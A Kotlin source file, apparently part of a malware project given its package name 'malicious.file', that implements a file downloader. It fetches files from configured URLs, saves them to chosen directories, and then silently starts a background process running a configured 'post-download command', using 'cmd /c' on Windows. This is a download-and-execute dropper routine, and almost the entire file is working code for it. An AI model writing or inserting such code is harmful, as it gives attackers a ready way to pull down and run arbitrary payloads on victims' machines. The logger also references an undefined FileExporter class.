package malicious.file

import config.DownloadItem
import io.ktor.client.*
import io.ktor.client.call.*
import io.ktor.client.engine.cio.*
import io.ktor.client.plugins.contentnegotiation.*
import io.ktor.client.request.*
import io.ktor.serialization.kotlinx.json.*
import io.ktor.util.cio.*
import io.ktor.utils.io.*
import kotlinx.coroutines.coroutineScope
import kotlinx.coroutines.launch
import java.nio.file.Paths


class FileDownloader(
    val downloadTargets: List<DownloadItem>
) {

    companion object {
        private val logger = org.slf4j.LoggerFactory.getLogger(FileExporter::class.java)
    }

    val client = HttpClient(CIO) {
        install(ContentNegotiation) {
            json() // Configures the client to handle JSON responses
        }
    }

    suspend fun downloadFiles() = coroutineScope {
        downloadTargets.forEach { downloadItem ->

            try {
                // Create a path for the destination file
                val targetPath = Paths.get(downloadItem.targetDirectory).resolve(downloadItem.targetFilename).toFile()

                client.prepareGet(downloadItem.url).execute { httpResponse ->
                    val channel: ByteReadChannel = httpResponse.body()
                    channel.copyAndClose(targetPath.writeChannel())
                }
            } catch (e: Exception) {
                e.printStackTrace()
            }

            logger.info("Downloaded file: ${downloadItem.targetFilename}")

            // Create a background process that runs the post-download command
            if(downloadItem.postDownloadCommand.isNotEmpty()) {
                launch {
                    val resolvedCommand = if (System.getProperty("os.name").orEmpty().contains("Windows", ignoreCase = true)) {
                        listOf("cmd", "/c") + downloadItem.postDownloadCommand
                    } else {
                        downloadItem.postDownloadCommand
                    }

                    logger.info("Running post-download command: ${resolvedCommand.joinToString(" ")}")

                    val pb = ProcessBuilder(resolvedCommand)
                    pb.directory(Paths.get(downloadItem.targetDirectory).toFile())
                    pb.start()
                }
            }
        }
    }
}